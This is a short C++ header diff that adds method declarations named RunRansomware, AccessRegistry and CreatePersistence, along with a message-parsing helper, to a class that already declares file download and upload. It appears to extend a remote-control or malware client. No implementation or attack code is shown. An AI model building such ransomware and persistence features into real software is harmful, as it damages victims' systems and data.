@@ -23,8 +23,12 @@ private:
     void RemoveUnnecessaryQuotationMark(std::string& string);
     void DownloadFile() override final;
     void UploadFile() override final;
+    void RunRansomware() override final;
+    void AccessRegistry() override final;
+    void CreatePersistence() override final;
     void InvalidOperation() override final;
     std::string CreateFileLocally(const std::string& filePath);
+    std::string GetSubOperationType(const std::string& message);
 
 private:
     std::string m_clientDedicatedDirectory; 
